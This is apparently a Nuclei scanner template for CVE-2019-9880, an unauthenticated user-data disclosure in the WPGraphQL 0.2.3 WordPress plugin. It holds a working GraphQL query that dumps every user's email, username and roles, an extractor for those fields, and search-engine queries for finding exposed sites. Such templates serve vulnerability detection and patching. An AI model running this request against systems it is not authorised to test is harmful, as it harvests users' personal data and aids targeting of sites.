http:
- extractors:
  - json:
    - '.data.users.nodes[] | "username: " + .username + ", email: " + .email'
    name: user-data
    type: json
  matchers:
  - condition: and
    dsl:
    - contains_all(body, "{\"data\":{", "\"name\":", "\"roles\":")
    - contains(content_type, "application/json")
    - status_code == 200
    type: dsl
  raw:
  - 'POST /graphql HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/json


    {"query": "query { users { nodes { id name email username roles } } }"}

    '
id: CVE-2019-9880
info:
  author: intelligent-ears
  classification:
    cpe: cpe:2.3:a:wpengine:wpgraphql:0.2.3:*:*:*:*:wordpress:*:*
    cve-id: CVE-2019-9880
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
    cvss-score: 9.1
    cwe-id: CWE-306
    epss-percentile: 0.98375
    epss-score: 0.6462
  description: 'An issue was discovered in the WPGraphQL 0.2.3 plugin for WordPress.
    By querying the ''users'' RootQuery, it is possible, for an unauthenticated attacker,
    to retrieve all WordPress users details such as email address, role, and username.

    '
  impact: 'An attacker can exploit this vulnerability to enumerate all WordPress users
    and extract sensitive information including email addresses, usernames, and user
    roles without authentication.

    '
  metadata:
    fofa-query: body="/wp-content/plugins/wp-graphql/"
    framework: wordpress
    max-request: 1
    product: wpgraphql
    publicwww-query: /wp-content/plugins/wp-graphql/
    vendor: wpengine
    verified: true
  name: WPEngine WPGraphQL 0.2.3 - Unauthenticated User Information Disclosure
  reference:
  - http://packetstormsecurity.com/files/153025/WordPress-WPGraphQL-0.2.3-Authentication-Bypass-Information-Disclosure.html
  - https://github.com/pentestpartners/snippets/blob/master/wp-graphql0.2.3_exploit.py
  - https://github.com/wp-graphql/wp-graphql/releases/tag/v0.3.0
  - https://www.pentestpartners.com/security-blog/pwning-wordpress-graphql/
  remediation: 'Update WPGraphQL to version 0.3.0 or later to fix this vulnerability.

    '
  severity: critical
  tags: cve,cve2019,wp,wp-plugin,wordpress,wp-graphql,wpengine,unauth,info-leak,vkev,vuln
